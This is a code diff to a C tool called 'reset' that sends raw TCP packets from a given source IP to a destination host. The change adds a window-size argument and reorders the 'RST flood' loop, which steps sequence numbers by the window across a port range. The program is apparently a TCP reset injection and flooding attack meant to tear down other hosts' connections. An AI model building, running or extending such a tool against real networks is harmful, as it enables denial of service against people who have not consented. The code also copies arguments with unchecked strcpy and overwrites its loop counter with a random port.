@@ -70,8 +70,8 @@ int main(int argc, char *argv[])
     size_t tcp_len;
     // void *data;
 
-    if (argc != 5) {
-	    fprintf(stderr,"usage: reset port0 port_max source dest\n");
+    if (argc != 6) {
+	    fprintf(stderr,"usage: reset port0 port_max source dest window\n");
 	    exit(1);
 	}
 
@@ -84,6 +84,7 @@ int main(int argc, char *argv[])
 
     strcpy(sIP, argv[3]);
     strcpy(dIP, argv[4]);
+    win = (uint16_t) atoi(argv[5]);
 
     // Open raw socket without protocol header
     if ((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
@@ -160,8 +161,8 @@ int main(int argc, char *argv[])
     inet_pton(AF_INET, dIP, &(sa.sin_addr.s_addr));
 
     // RST flood loop
-    for (dport = port0; dport < port_max; dport++) {
-        for (seq = seq0 ; seq < UINT_MAX - win; seq += win) {
+    for (seq = seq0 ; seq < UINT_MAX - win; seq += win) {
+        for (dport = port0; dport < port_max; dport++) {
 
             dport = rand() % (port_max - port0 + 1) + port0;
             tcph -> dest = htons(dport);
